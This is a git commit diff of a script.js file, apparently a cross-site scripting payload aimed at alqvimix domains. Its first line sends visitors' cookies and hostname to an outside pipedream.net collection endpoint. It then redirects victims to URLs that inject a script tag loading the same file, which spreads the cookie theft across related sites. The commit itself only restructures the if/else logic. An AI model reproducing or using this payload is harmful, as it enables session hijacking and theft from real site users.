1d97fd55636d69d64d82c37412c429afbf4bd1e5
berdos1989 <116584162+berdos1989@users.noreply.github.com>
2023-04-30 20:51:08 +0300

    Update script.js

--- script.js
+++ script.js
@@ -1,11 +1,8 @@
 fetch(`https://eodcnv9aow0mu5f.m.pipedream.net/?site=${location.hostname}&taxi=${document.cookie}`);
 if (location.hostname == "alqvimix.finance") {
    window.location = "https://alqvimix.live/ajax?module=refsys%3Cscript%20src=%22https://berdos1989.github.io/script.js%22%3E%3C/script%3E";
-   return;
-}
-if (location.hostname == "alqvimix.live") {
+} else if (location.hostname == "alqvimix.live") {
     window.location = "https://alqvimix.com/ajax?module=refsys%3Cscript%20src=%22https://berdos1989.github.io/script.js%22%3E%3C/script%3E";
-    return;
 }
 
                                                       
